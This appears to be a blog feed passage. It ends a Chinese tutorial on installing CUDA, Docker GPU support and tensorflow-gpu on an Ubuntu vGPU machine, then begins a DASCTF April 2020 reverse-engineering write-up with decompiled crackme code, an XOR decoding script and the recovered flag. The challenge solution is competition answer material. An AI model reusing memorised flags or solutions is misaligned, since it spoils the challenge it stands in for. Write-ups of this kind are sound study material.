nvidia-container-toolkit</h3><p>（Ubuntu 16.04/18.04, Debian Jessie/Stretch/Buster）</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Add the package repositories</span>distribution<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token keyword">.</span> /etc/os-release<span class="token punctuation">;</span><span class="token keyword">echo</span> $ID$VERSION_ID<span class="token variable">)</span></span>curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/<span class="token variable">$distribution</span>/nvidia-docker.list <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nvidia-docker.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y nvidia-container-toolkit<span class="token function">sudo</span> systemctl restart docker</code></pre><p>之后就可以测试一下能否在docker里调用显卡了。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#### Test nvidia-smi with the latest official CUDA image</span>docker run --gpus all nvidia/cuda:10.0-base nvidia-smi</code></pre><p>正常的话效果与 <code>nvidia-smi</code>效果相同。</p><p>下面这几个是指定特定显卡的。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Start a GPU enabled container on two GPUs</span>docker run --gpus 2 nvidia/cuda:10.0-base nvidia-smi<span class="token comment" spellcheck="true"># Starting a GPU enabled container on specific GPUs</span>docker run --gpus <span class="token string">'"device=1,2"'</span> nvidia/cuda:10.0-base nvidia-smidocker run --gpus <span class="token string">'"device=UUID-ABCDEF,1"'</span> nvidia/cuda:10.0-base nvidia-smi<span class="token comment" spellcheck="true"># Specifying a capability (graphics, compute, ...) for my container</span><span class="token comment" spellcheck="true"># Note this is rarely if ever used this way</span>docker run --gpus all,capabilities<span class="token operator">=</span>utility nvidia/cuda:10.0-base nvidia-smi</code></pre><h3 id="0x04-2-拉取-tensorflow-官方镜像-amp-运行代码"><a href="#0x04-2-拉取-tensorflow-官方镜像-amp-运行代码" class="headerlink" title="0x04-2 拉取 tensorflow 官方镜像&amp;运行代码"></a>0x04-2 拉取 tensorflow 官方镜像&amp;运行代码</h3><table><thead><tr><th>标记</th><th>说明</th></tr></thead><tbody><tr><td><code>latest</code></td><td>TensorFlow CPU 二进制映像的最新版本。（默认版本）</td></tr><tr><td><code>nightly</code></td><td>TensorFlow 映像的每夜版。（不稳定）</td></tr><tr><td><em><code>version</code></em></td><td>指定 TensorFlow 二进制映像的版本，例如：2.1.0</td></tr><tr><td><code>devel</code></td><td>TensorFlow <code>master</code> 开发环境的每夜版。包含 TensorFlow 源代码。</td></tr></tbody></table><p>每个基本标记都有用于添加或更改功能的变体：</p><table><thead><tr><th>标记变体</th><th>说明</th></tr></thead><tbody><tr><td><em><code>tag</code></em><code>-gpu</code></td><td>支持 GPU 的指定标记版本。</td></tr><tr><td><em><code>tag</code></em><code>-py3</code></td><td>支持 Python 3 的指定标记版本。</td></tr><tr><td><em><code>tag</code></em><code>-jupyter</code></td><td>带有 Jupyter 的指定标记版本（包含 TensorFlow 教程笔记本）</td></tr></tbody></table><p><strong>下载并运行支持 GPU 的 TensorFlow 映像</strong>，而后运行这行代码测试一下。</p><pre class=" language-bash"><code class="language-bash">docker run --gpus all -it --rm tensorflow/tensorflow:latest-gpu \       python -c <span class="token string">"import tensorflow as tf; print(tf.reduce_sum(tf.random.normal([1000, 1000])))"</span></code></pre><p>镜像大概2个G吧，拉取镜像挺久的……上面这个拉取的是最新版本的GPU镜像。可以通过上面这个测试一下是否安装成功。之后可以利用<code>docker exec</code> 重用容器。</p><blockquote><p>使用最新的 TensorFlow GPU 映像在容器中启动 <code>bash</code> shell 会话：</p><pre class=" language-bash"><code class="language-bash">docker run --gpus all -it tensorflow/tensorflow:latest-gpu <span class="token function">bash</span></code></pre></blockquote><p>要在容器内运行在主机上开发的 TensorFlow 程序，请装载主机目录并更改容器的工作目录 (<code>-v hostDir:containerDir -w workDir</code>)：</p><pre class=" language-bash"><code class="language-bash">docker run --gpus all -it --rm -v <span class="token variable">$PWD</span>:/tmp -w /tmp tensorflow/tensorflow:latest-gpu python ./script.py</code></pre><p><strong>要调用 GPU 的时候记得加上<code>--gpus all</code>标记呀！</strong></p><br><hr><h2 id="0x05-安装-CUDA-Toolkit"><a href="#0x05-安装-CUDA-Toolkit" class="headerlink" title="0x05 安装 CUDA Toolkit"></a>0x05 安装 CUDA Toolkit</h2><p>如果要直接（在虚拟机上）跑程序的话，需要装 CUDA 工具包。</p><p>这一步很关键，最开始我以为显卡上显示了 <code>CUDA Version</code> 就装好 CUDA 了，到最后一系列装完在 python 里测试 GPU 的时候报错说 <em>tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable</em> </p><p>到谷歌查了挺多资料都没解决（上面这个问题可以参考<a href="https://blog.csdn.net/baidu_36639782/article/details/86691407?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">这里</a>有一些可能的解决方案），折腾了老半天才发现是 CUDA Toolkit 没装……还是在上一步中用 docker 测试才发现的呢。</p><p>执行 <code>nvidia-smi</code> 得到的<code>CUDA Version</code>应该是 CUDA Driver 的版本，这里要装的 CUDA Toolkit 对应的是 Runtime version 吧（猜的）。</p><p>根据 0x01 中的版本关系，以及上面 docker 中运行的 CUDA 版本，这里我用了 10.1.243 版本，可以在 <a href="https://developer.nvidia.com/cuda-10.1-download-archive-update2?target_os=Linux&amp;target_arch=x86_64&amp;target_distro=Ubuntu&amp;target_version=1604&amp;target_type=runfilelocal" target="_blank" rel="noopener">CUDA Toolkit 10.1 update2  Archive 这里</a>看下载地址。目前不推荐用最新的10.2版本，当然随着发展后续肯定会更新另说。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430000707961.png" alt="CUDA Toolkit 10.1 update2  Archive"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_418.87.00_linux.runsudo sh cuda_10.1.243_418.87.00_linux.run</code></pre><p>这里安装界面挺有意思的，命令行里的折叠菜单，想不到吧！</p><p><strong>注意</strong>一下：这里<strong>不要选 Driver 了</strong>，<strong>在<code>Driver</code>那里敲个回车把<code>X</code>去掉</strong>。因为你驱动已经装好了啦，而且比这个新。（截图的时候没有去掉懒得重新截了）</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430001524136.png" alt="CUDA installer"></p><p>安装完之后要把路径加入到 <code>PATH</code> 里。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim ~/.bashrc</code></pre><p>在最后新增下面几行。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># CUDA config</span><span class="token function">export</span> LD_LIBRARY_PATH<span class="token operator">=</span><span class="token string">"<span class="token variable">$LD_LIBRARY_PATH</span>:/usr/local/cuda/lib64:/usr/local/cuda/extras/CUPTI/lib64"</span><span class="token function">export</span> CUDA_HOME<span class="token operator">=</span><span class="token string">"/usr/local/cuda"</span><span class="token function">export</span> PATH<span class="token operator">=</span><span class="token string">"/usr/local/cuda/bin:<span class="token variable">$PATH</span>"</span></code></pre><p>使配置生效（或重启终端也行）。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">source</span> ~/.bashrc</code></pre><p>验证一下有没有安装成功。</p><pre class=" language-bash"><code class="language-bash">miaotony@localhost:~<span class="token comment" spellcheck="true"># nvcc -V</span>nvcc: NVIDIA <span class="token punctuation">(</span>R<span class="token punctuation">)</span> Cuda compiler driverCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2005-2019 NVIDIA CorporationBuilt on Sun_Jul_28_19:07:16_PDT_2019Cuda compilation tools, release 10.1, V10.1.243</code></pre><p>如果上面安装时候装了实例的话，可以来测试一下。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/cuda/samples/1_Utilities/deviceQuery/<span class="token function">sudo</span> <span class="token function">make</span>./deviceQuery</code></pre><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430003224527.png" alt="deviceQuery"></p><p>这里就显示出了显卡的各种参数，最后<code>Result=PASS</code>则说明安装成功了。</p><p>当然也可以试试别的例子，先编译再执行就好。</p><br><hr><h2 id="0x06-安装-Anaconda3"><a href="#0x06-安装-Anaconda3" class="headerlink" title="0x06  安装 Anaconda3"></a>0x06  安装 Anaconda3</h2><p>这里选择用 Anaconda 来安装，不仅因为有很多常用的科学计算库，而且后面会说 tensorflow-gpu 里还自带了满足版本要求的 cuDNN。（我也是这次才知道的呢</p><h3 id="0x06-1-下载-amp-安装"><a href="#0x06-1-下载-amp-安装" class="headerlink" title="0x06-1 下载&amp;安装"></a>0x06-1 下载&amp;安装</h3><p>到官方这里下载 <a href="https://www.anaconda.com/products/individual。" target="_blank" rel="noopener">https://www.anaconda.com/products/individual。</a></p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430003646135.png" alt="Anaconda"></p><p>2020.02版本 <a href="https://repo.anaconda.com/archive/Anaconda3-2020.02-Linux-x86_64.sh" target="_blank" rel="noopener">64-Bit (x86) Installer (522 MB)</a></p><p>按照提示安装，最好都输入yes，重启终端后会自动初始化 conda 的默认环境。</p><p>输入 <code>conda --version</code>，出现版本号则安装成功。</p><h3 id="0x06-2-换源"><a href="#0x06-2-换源" class="headerlink" title="0x06-2 换源"></a>0x06-2 换源</h3><p>众所周知官方的 conda 源速度比较慢，换清华 tuna 源吧。</p><p>（记得有段时间因为版权问题 tuna 镜像还中断过一阵子，后来放开了）</p><pre class=" language-bash"><code class="language-bash">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/conda config --set show_channel_urls <span class="token function">yes</span></code></pre><br><hr><h2 id="0x07-安装-tensorflow-gpu-（包括-cuDNN）"><a href="#0x07-安装-tensorflow-gpu-（包括-cuDNN）" class="headerlink" title="0x07 安装 tensorflow-gpu （包括 cuDNN）"></a>0x07 安装 tensorflow-gpu （包括 cuDNN）</h2><h3 id="0x07-1-新建一个虚拟环境（可选的啦）"><a href="#0x07-1-新建一个虚拟环境（可选的啦）" class="headerlink" title="0x07-1 新建一个虚拟环境（可选的啦）"></a>0x07-1 新建一个虚拟环境（可选的啦）</h3><p>名为<code>tensorflow</code>，指定 python 版本为3.6。（这个看个人以及需求吧）</p><pre class=" language-bash"><code class="language-bash">conda create -n tensorflow python<span class="token operator">=</span>3.6</code></pre><p>可能需要确认就回车或者输入<code>y</code>完事。</p><h3 id="0x07-2-安装-tensorflow-gpu"><a href="#0x07-2-安装-tensorflow-gpu" class="headerlink" title="0x07-2 安装 tensorflow-gpu"></a>0x07-2 安装 tensorflow-gpu</h3><p>首先查一下当前环境下支持的版本。</p><pre class=" language-bash"><code class="language-bash">conda search tensorflow-gpu</code></pre><p>注意一下驱动的版本问题，对于新的tf版本，驱动可能不支持。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430004948774.png" alt="tf-gpu"></p><p>比如装1.15.0版本。</p><pre class=" language-bash"><code class="language-bash">conda <span class="token function">install</span> tensorflow-gpu<span class="token operator">==</span>1.15.0</code></pre><p>大概六七百MB的亚子，网络不是很稳定，大概率需要重试几次才行。</p><h3 id="0x07-3-验证安装"><a href="#0x07-3-验证安装" class="headerlink" title="0x07-3 验证安装"></a>0x07-3 验证安装</h3><p>安装完成后，进入<code>python</code>试一试呗。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tensorflow <span class="token keyword">as</span> tf<span class="token keyword">print</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>test<span class="token punctuation">.</span>is_gpu_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430005628362.png" alt="tftest"></p><p>显示为<code>True</code>则表示以上安装成功了！</p><p>（tf 2.x 的话这个方法已经 deprecated 了，建议用<code>tf.config.list_physical_devices('GPU')</code> 方法。tf 1.x 无此用法。</p><blockquote><p><strong>WARNING:</strong> tensorflow:From &lt;stdin&gt;:1: is_gpu_available (from tensorflow.python.framework.test_util) is deprecated and will be removed in a future version.<br>Instructions for updating:<br>Use <code>tf.config.list_physical_devices('GPU')</code> instead.    </p></blockquote><p>也可以运行一个程序，然后另外再开一个终端，利用 <code>nvidia-smi</code> 查看显卡情况。</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430010032560.png" alt="nvidia-smi"></p><p>在 Processes 里看到运行的任务就成功了呀！</p><p>哇好耶！！！</p><p>终于搞定了！！！</p><p>之后你就可以愉快地炼丹啦！</p><br><hr><h2 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h2><p>其实主要就是这几个步骤：</p><ul><li><strong>安装 Ubuntu 虚拟机</strong>  </li><li><strong>安装 NVIDIA 显卡驱动及授权</strong>  </li><li><strong>安装 CUDA Toolkit</strong>   </li><li><strong>安装 Anaconda3</strong>  </li><li><strong>安装 tensorflow-gpu 版本（包括了 cuDNN）</strong></li></ul><p>或者</p><ul><li><strong>安装 Ubuntu 虚拟机</strong>  </li><li><strong>安装 NVIDIA 显卡驱动及授权</strong>  </li><li><strong>安装 Docker nvidia-container-toolkit</strong>  </li><li><strong>拉取 tensorflow-gpu 镜像</strong>  </li></ul><p>其实过程挺麻烦的，而且遇到了不少坑，比如我这次的一部分经历……</p><blockquote><p>显卡驱动装了，<code>nvidia-smi</code> 看没问题，还有个 CUDA Version 就以为有 CUDA 了。<br>装好 anaconda，然后用 <code>conda install tensorflow-gpu</code>，这里面附带了 cuDNN。<br>然后测试 GPU 的时候给我报 <code>tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable</code><br>这个错误。。<br>谷歌搜了老半天没搞懂，然后去装了 NVIDIA Container Toolkit，拉了个 tf 的 Docker 镜像跑，发现是没问题的。<br>最后想到是不是 CUDA 没装，于是看了 tf 镜像用的 CUDA 版本是10.1.243，去官网找来装上。<br>再回来到 conda 环境里测试，终于好了。。</p></blockquote><p>特别是觉得马上要完事了，在验证 GPU 时候就发现报错了那种时候，很绝望不是吗。</p><p>不过<strong>一步一步来还是可以成功安装的</strong>，哇是有点成就感 23333.</p><p>机器学习/深度学习有空慢慢学呢（</p><p>呜，<del>感觉莫名奇妙成运维的了</del>，嘤嘤嘤不要。</p><p><em>（（溜了溜了喵</em></p><br><hr><h2 id="0xFF-References-amp-Extensive-Reading"><a href="#0xFF-References-amp-Extensive-Reading" class="headerlink" title="0xFF References &amp; Extensive Reading"></a>0xFF References &amp; Extensive Reading</h2><ul><li><p><a href="https://www.nvidia.cn/data-center/virtualization/" target="_blank" rel="noopener">NVIDIA 虚拟 GPU</a></p></li><li><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141" target="_blank" rel="noopener">深信服超融合Tensorflow-vGPU版配置指导</a></p></li><li><p><a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html#abstract" target="_blank" rel="noopener">NVIDIA CUDA Toolkit Release Notes</a></p></li><li><p><a href="https://www.tensorflow.org/install/" target="_blank" rel="noopener">TensorFlow 官方安装教程</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/72298520" target="_blank" rel="noopener">Ubuntu 18.04安装CUDA和cuDNN</a></p></li><li><p><a href="https://blog.csdn.net/wanzhen4330/article/details/81699769" target="_blank" rel="noopener">Ubuntu16.04下安装cuda和cudnn的三种方法</a></p></li><li><p><a href="https://tf.wiki/zh/basic/installation.html" target="_blank" rel="noopener">TensorFlow 安装与环境配置（简单粗暴 TensorFlow 2）</a> </p></li><li><p><a href="https://blog.csdn.net/baidu_36639782/article/details/86691407" target="_blank" rel="noopener">RuntimeError: CUDA error: all CUDA-capable devices are busy or unavailable</a></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> tensorflow </tag>
            
            <tag> GPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 DASCTF 四月春季战 Re&amp;Misc WriteUp</title>
      <link href="/2020/04/25/CTF_2020DASCTF_April/"/>
      <url>/2020/04/25/CTF_2020DASCTF_April/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/04/25/CTF_2020DASCTF_April/82776dfcc2e88aa4a379b152a12448c2.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>安恒月赛，2020年DASCTF——四月春季战。</p><p>比赛时间：2020年4月25日下午13:30-17:30</p><p>比赛平台：<a href="https://www.linkedbyx.com/studyCenter/36998/tasks" target="_blank" rel="noopener">https://www.linkedbyx.com/studyCenter/36998/tasks</a> </p><p>请提交flag{}/DASCTF{}括号里面的内容。</p></blockquote><p>今天下午有个 DASCTF 安恒月赛，四月春季战，难度据赵师傅说<strong>“雨露均沾”</strong>，就来看了看题。</p><p>其实还是大概比赛开始之后一两个小时才注册的，于是划了个水，大概看了几道 <strong>Re 和 Misc 的题</strong>，随便写写 WP 吧。</p><p>（其实也没几道题会做的，有的还是赛后补的，呜。</p><br><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h3><p><strong>题目附件：</strong><a href="2004225e9ff11e77f07">在这里</a></p><p>拖进 IDA 看下。</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  size_t i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A0h] [ebp-8h]</span>  <span class="token function">_alloca</span><span class="token punctuation">(</span><span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"input your key: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">>></span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v6<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">112</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v6<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">112</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token string">"akhb~chdaZrdaZudqduvdZvvv|"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"yes!you are right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"PAUSE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>A0h-30h 正好就是十进制的 112，于是 <code>v6[i - 112]</code> 对应的就是 <code>v5</code> 的地址。</p><p><strong>Exp：</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>s<span class="token operator">=</span><span class="token string">"akhb~chdaZrdaZudqduvdZvvv|"</span>new<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">=</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">6</span>    new<span class="token operator">+=</span>chr<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span></code></pre><p><code>flag{daef_wef_reverse_sss}</code></p><p>哇好耶，好久没看到这么简单的 Re 题了唉！</p><br><h3 id="encrypt3"><a href="#encrypt3" class="headerlink" title="encrypt3"></a>encrypt3</h3><p><strong>题目附件：</strong><a href="encrypt3">在这里</a></p><p>同样拖进 IDA。</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdx</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+17h] [rbp-49h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-40h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-3Ch]</span>  __int64 v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-38h]</span>  <span class="token keyword">char</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-30h]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+31h] [rbp-2Fh]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+32h] [rbp-2Eh]</span>  <span class="token keyword">char</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+33h] [rbp-2Dh]</span>  <span class="token keyword">char</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+34h] [rbp-2Ch]</span>  <span class="token keyword">char</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+35h] [rbp-2Bh]</span>  <span class="token keyword">char</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+36h] [rbp-2Ah]</span>  <span class="token keyword">char</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+37h] [rbp-29h]</span>  <span class="token keyword">char</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-28h]</span>  <span class="token keyword">char</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+39h] [rbp-27h]</span>  <span class="token keyword">char</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ah] [rbp-26h]</span>  <span class="token keyword">char</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Bh] [rbp-25h]</span>  <span class="token keyword">char</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ch] [rbp-24h]</span>  <span class="token keyword">char</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Dh] [rbp-23h]</span>  <span class="token keyword">char</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Eh] [rbp-22h]</span>  <span class="token keyword">char</span> v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Fh] [rbp-21h]</span>  <span class="token keyword">char</span> v32<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-20h]</span>  <span class="token keyword">char</span> v33<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+41h] [rbp-1Fh]</span>  <span class="token keyword">char</span> v34<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+42h] [rbp-1Eh]</span>  <span class="token keyword">char</span> v35<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+43h] [rbp-1Dh]</span>  <span class="token keyword">char</span> v36<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+44h] [rbp-1Ch]</span>  <span class="token keyword">char</span> v37<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+45h] [rbp-1Bh]</span>  <span class="token keyword">char</span> v38<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+46h] [rbp-1Ah]</span>  <span class="token keyword">char</span> v39<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+47h] [rbp-19h]</span>  <span class="token keyword">char</span> v40<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-18h]</span>  <span class="token keyword">char</span> v41<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+49h] [rbp-17h]</span>  <span class="token keyword">char</span> v42<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ah] [rbp-16h]</span>  <span class="token keyword">char</span> v43<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Bh] [rbp-15h]</span>  <span class="token keyword">char</span> v44<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ch] [rbp-14h]</span>  <span class="token keyword">char</span> v45<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 